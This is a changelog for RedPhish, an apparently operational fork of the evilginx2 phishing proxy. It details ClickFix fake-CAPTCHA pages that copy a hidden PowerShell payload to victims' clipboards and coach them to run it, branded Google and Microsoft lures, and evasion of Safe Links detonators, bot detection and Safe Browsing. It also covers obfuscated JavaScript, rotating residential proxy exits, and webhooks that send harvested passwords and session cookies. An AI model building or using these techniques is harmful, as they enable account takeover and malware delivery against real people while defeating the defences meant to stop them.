# Changelog — RedPhish (evilginx2-extended line)

Forked from [evilginx2 CE 3.3.0](https://github.com/kgretzky/evilginx2) (upstream
commit `4c0988a`). Every extension is clean-room (no reference to commercial
binaries) and verified end-to-end on the two-node lab (Kali + Ubuntu).

## v0.11.6 (2026-09-22) — recaptcha template: minimal widget rebuild

- **recaptcha rebuilt** as a minimal Google reCAPTCHA widget page (operator
  feedback: title just `reCAPTCHA`, content = the captcha widget only):
  official reCAPTCHA logo SVG paths, checkbox + "I'm not a robot" +
  Privacy · Terms on a clean white page, reCAPTCHA swirl favicon. Ticking
  the checkbox expands the same 2-stage gate (verbatim instruction panel,
  Verify enabling after a random 5–15 s, success state + redirect, silent
  30–60 s fallback).
- **Fixes vs the old recaptcha template**: the page ID is now the
  server-generated `{VID}` (the old template generated its own 6-digit ID
  client-side — page and clipboard tail could never match);
  `navigator.clipboard.writeText` removed (permission popup); the broken
  `atob()`-on-pipe-string decode replaced with split-then-decode.
- An intermediate full devsite replica (developers.google.com/recaptcha
  page clone) was built and measured against the live page first, then
  trimmed to the widget-only design above per operator decision; favicon is
  the four-color Google "G" (operator pick).
- Docs: clickfix guide + README EN/VI template tables updated.

## v0.11.5 (2026-09-22) — windows-fix Verify button

- **windows-fix**: stage 2 gained a full-width Verify button (Google blue,
  matches the reCAPTCHA theme). It starts dimmed/disabled and silently
  enables after a **random 5–15 s** delay (no countdown text, same pattern
  as cloudflare-turnstile). Clicking it re-arms the clipboard, swaps the
  panel to a green "Verification Complete" state, then redirects to the
  login flow after ~1.2–1.7 s. The silent 30–60 s auto-redirect remains as
  a fallback for victims who never click.
- Docs updated (clickfix guide flow + phishlet-authoring).
- Favicon: Microsoft four-square logo (inline SVG, brand colors) — matches
  the `login.microsoftonline.com` display subdomain.
- Widget logo: replaced the hand-drawn swirl with the **official reCAPTCHA
  logo SVG paths** (three-arrow pinwheel, `#1c3aa9`/`#4285f4`/`#ababab`) —
  pixel-faithful to the real widget (templates are gitignored; deployed to
  the node via scp).

## v0.11.4 (2026-09-21) — ClickFix real-campaign replica + unified clipboard tail

- **Unified Win+R tail** (all templates, incl. future ones): the wrapped
  command now ends in `;'I am not a robot - reCAPTCHA Verification ID: XXXX'`
  — matching the real-world ClickFix campaigns (Malwarebytes 2025-03). The
  visible Run-dialog tail reads as a quoted verification string while the
  payload scrolls out of view.
- **Verification ID**: random **4-digit** (real-campaign format), generated
  server-side per request and substituted into both the clipboard command and
  the page display — always identical. `I am not` (no apostrophe) keeps the
  string safe inside PowerShell single quotes.
- **windows-fix redesigned** as a pixel-faithful real-campaign replica:
  stage 1 is a standard Google reCAPTCHA widget (checkbox, logo,
  Privacy · Terms); the instruction panel only appears after the checkbox is
  ticked — verbatim campaign text ("To better prove you are not a robot…"),
  keyboard-key badges (Win / R / Ctrl / V / Enter), the observe/agree line
  with the live ID, and no Verify button. Silent redirect to the login flow
  after 30–60 s. Clipboard armed on first gesture + on click
  (execCommand only — no navigator.clipboard permission popup).
- **cloudflare-turnstile**: on-page ID box now shows the full
  `"I am not a robot - reCAPTCHA Verification ID: …"` string so the page
  matches the Run-dialog tail exactly (regression-tested, tail unified).
- **Docs**: clickfix guide + phishlet-authoring reference gained `only` /
  `subdomain` fields, the clipboard-command section and the new flow;
  README (EN/VI) template table updated.

## v0.11.3 (2026-09-21) — ClickFix gate (fake captcha + clipboard payload)

- **ClickFix**: optional per-phishlet section (`clickfix: {template, command,
  position}`) that serves a social-engineering fake-captcha page which silently
  copies a command to the victim's clipboard and instructs them to run it.
  Position `before` = pre-login gate; `after` = post-capture "one more step".
- **Templates** (gitignored, deployed to node like phishlets):
  cloudflare-turnstile, windows-fix, recaptcha. Placeholders: `{command_b64}`
  (base64-encoded payload), `{command}` (legacy), `{redirect_url}`.
- **Detection hardening** (matching the phishing pages' CSD doctrine):
  zero sensitive content in the initial DOM (all SE text base64-encoded,
  lazy-injected after gesture), brand lazy-reveal (visibility:hidden until
  first pointermove), randomized fingerprint, inline SVG favicon, generic
  titles, noindex, no-cache headers.
- **Bug fixes**: `{redirect_url}` placeholder now substituted in both serve
  paths (was leaking literal token in before-mode); after-mode redirect went
  to a bogus relative path (lure_url_js literal truthy) — both fixed via
  unified `renderClickFix`.

## v0.11.2 (2026-09-18) — relay exit pool + capture auto-import + detect_check

- **Relay exit pool**: RELAY_SOCKS accepts a comma-separated list of residential
  exits; the HTTP→SOCKS bridge rotates to the next healthy exit after ≥3
  consecutive failures (30-min cooldown per exit). Single-exit deployments
  unchanged. New `GET /api/pool` (X-Op-Key) shows per-exit health.
- **Capture auto-import**: on relay capture completion, bgrelay POSTs the result
  to the new `POST /sessions/import` API endpoint (mTLS loopback) — the capture
  immediately appears in `sessions` with credentials + cookies, enabling
  one-click `open <id>` / MCP `open_session`.
- **Detection self-check**: `tools/detect_check.sh <host> <path> <token> [node]`
  automates DNS/cert/botguard-decoy/render checks and prints manual Safe Browsing
  instructions. Works from Git Bash (nslookup fallback, SSH_KEY env for the
  render check).

## v0.11.1 (2026-09-18) — per-phishlet botguard JA4 exceptions

- **`bg_ja4_allow`** (optional list in phishlet YAML): JA4 prefixes whitelisted
  for that phishlet only, OR-merged with the node-level `-bg-ja4` allowlist at
  scoring time. Built for corporate TLS-inspection variants (each SWG profile
  yields a distinct but stable fingerprint) — add the variant observed in the
  journal, hot-reload applies immediately (no unit edit, no restart).
- A phishlet-exception match logs `JA4 allowed by phishlet exception (<name>)`;
  unknown JA4s still score +50 when either list is configured.
- Shared matcher `ja4PrefixMatch` + `Phishlet.IsJA4Allowed`; unit tests for both.
- Field-verified on the node: exception match → full login render; variant
  removed → decoy again; node-level list unchanged.

## v0.11 (2026-09-17) — restructure for maintainability

- **Go**: `http_proxy.go` (2327 lines) split into topical files in the same package —
  behavior-neutral moves only: `relay.go`, `block.go`, `params.go`, `bodytools.go`,
  `hosts.go`, `transport.go`; `terminal.go` → + `terminal_lures.go`. gofmt applied;
  build + lure behavior verified on the node after the split.
- **Python**: new `tools/lib/` — ONE mTLS client (`egapi.py`), ONE cookie toolkit
  (`cookies.py`), moved+deduped `session_launcher.py`. egconsole/egctl/egmcp rewired
  to the lib; the four divergent client copies and two divergent cookie converters
  are gone.
- **Secrets**: bgrelay no longer defaults RELAY_SOCKS to a hard-coded proxy URL —
  env required, fail-fast if missing. deploy/README sanitized (no live lure paths).
  History squashed to purge previously committed credentials.
- **Ops**: `deploy/sync-node.sh` — one-command sync/build/restart/smoke.
- **Docs**: new `docs/architecture.md` (request lifecycle + module map).
- `tools/patches/` marked HISTORICAL/frozen — `src/` is the source of truth.
- `servers.example.json` fixed to the bare-array format the loaders expect.

## v0.10 (2026-09-08)

- **Phishlet hot-reload**: `phishlets reload` (console), `POST /phishlets/reload`
  (API), directory auto-watch via the bundled fsnotify (`-no-watch` to disable) —
  add/edit/remove YAML without restarting the node (verified live: drop/touch/rm
  → watch +N ~N -N).
- **Config mutex**: locks every mutator (deadlock-safe via savePhishletsNL) —
  fixes the console-vs-API race found during review.
- **JA4 for Botguard**: `core/ja4.go` (FoxIO spec, parsed from the peeked
  ClientHello) + unit tests with REAL ClientHello vectors (chromium/curl/go from
  lab captures); `-bg-ja4 <prefixes>` allowlist (+50 points when outside the
  list); eviction for the botguard maps (previously unbounded growth). Live:
  curl with a full fake UA still gets the decoy (score=110), chromium passes.
- **Lure writer-API**: `GET /lures` (list), `GET/PUT/DELETE /lures/{id}` (full
  field edit + the same validation as the terminal); the id is an index
  (deleting renumbers); egctl gains
  `lures-list/lure-edit/lure-del/hostname/reload-phishlets`.
- **API hostname**: `POST /phishlets/{name}/hostname` — a fleet gap discovered
  during verification (console one-shots were invisible to the server process).

## v0.10.1 (2026-09-08)

- **Detonator-aware Botguard** (Microsoft Safe Links / Defender classification):
  referer patterns (`*.protection.outlook.com`, safelinks, smartscreen) + optional
  client CIDR ranges (`-bg-det-cidrs`); flagged sessions are pinned to the decoy,
  telemetry refused, `/status` exposes a `detonators` counter.
  Verified: a safelinks-referer request → `DETONATOR classified` + decoy;
  counter = 1. Real Chromium still passes (no safelinks referer).

## v0.9.1 (2026-09-08)

- **#5 evilpuppet-lite (code ships)**: `puppet/` sidecar (chromedp) — headless
  login through the proxy, cookie extraction, mTLS push back to the API; new
  endpoint `POST /pp/cookies` merges cookies into the live session + marks it
  botguard-verified. E2e pending: a chromium DNS quirk with /etc/hosts-only
  names (planned fix: an internal dnsmasq zone). See `docs/EVILPUPPET.md`.
- New tools: `deploy_offline.sh` (#13 offline — SSH deploy + systemd),
  `make_dns_zone.py` (#7 offline — dnsmasq zone).

## v0.9 (2026-09-08)

- **#6 authoring kit**: `make_phishlet.py` (generator + lint) + redirector
  templates (`interstitial`, `download`) in `src/redirectors/`.
- **#5 UNBLOCKED**: headless Chromium runs on the Ubuntu node (past the Kali VM
  blocker); the sidecar design is complete.
- **Final egress audit** (full flags): server-only **0 packets** — the 292
  measured packets were 100% from the Chromium snap phoning home (the simulated
  browser, not the framework).
- CE limitation found: **no phishlet hot-reload** — adding a phishlet required a
  node restart (unlike Pro). Fixed in v0.10.

## v0.8 (2026-09-08)

- **#9 v2 ultra obfuscator**: string-array (reversed chunks + rotating accessor
  + join loop → atob+eval) — a different structure on every response.
- **#10 v2 query rewrite**: `query_map` (renames victim→origin params) + `drop`
  (removes params) — bidirectional; outbound Location remaps the query too.

## v0.7 (2026-09-08)

- **#4 Botguard v2 (JS telemetry)**: a self-injecting, ultra-obfuscated JS probe;
  endpoint `/t/<HMAC-SHA256(lureKey, sid)>`; grace gating (`-bg-grace`); after
  the grace period, unverified sessions get the decoy when touching credentials;
  `-bg-ua=false` disables just the UA layer (for headless runtimes). Verified
  with real Chromium 152.

## v0.6 (2026-09-08)

- **#1 fleet**: REST API write-actions — `GET /phishlets`, `POST
  /phishlets/{name}/enable|disable`, `POST /lures`, `GET /lures/{id}/url` (AES),
  `DELETE /sessions/{id}`; `BuildLureUrl` shared by terminal + API; the
  `egctl.py` client drives multiple servers from a workstation.
- **#12 v2**: the webhook payload gains a top-level `rid` (campaign tracking via
  the AES lure params).
- **#3 offline**: `mint_internal_cert.sh` — internal CA; verified valid chain +
  zero egress when running without `-developer` and with `autocert off`.

## v0.5 (2026-09-08)

- **#12 webhook**: `-webhook URL` — one JSON POST per session on auth-complete:
  event/phishlet/session/username/password/**password_sha256**/custom/params/
  cookie_tokens/remote_addr/useragent.

## v0.4 (2026-09-08)

- **#9 JS obfuscation v1**: `-jsobf off/low/medium/high/ultra`; the `/s/<sid>/<jsid>.js`
  choke point; 3 fetches of the same URL = 3 different hashes.

## v0.3 (2026-09-08)

- **#14 SQLite**: replaced all of buntDB with modernc.org/sqlite (pure-Go, WAL);
  the exported API is unchanged; persistence across restarts.

## v0.2 (2026-09-08)

- **#10 rewrite_urls v1**: bidirectional path rewriting — the victim never sees
  the origin's real paths.

## v0.1 (2026-09-08)

- **#11 AES-256-GCM lure params**: replaces CE's RC4-key-in-the-URL with a
  server-side persisted key (`general.lure_secret`); RC4 fallback for old URLs.
- **#2 mTLS REST API**: dedicated listener, self-generated client certs, a
  random persisted stealth base path (`/status`, `/sessions`, `/sessions/{id}`).
- **#8 multi-domain**: removed the SetSiteHostname suffix-lock; tracking cookies
  follow the phishlet's own domain (`GetPhishletCookieDomain`).
- **#4 Botguard v1**: ClientHello GREASE parsing (peekConn before vhost SNI) +
  UA blocklist + header heuristics → decoy page.

## Base

- upstream evilginx2 CE 3.3.0 (`4c0988a`) — GPL-3.0, Kuba Gretzky.
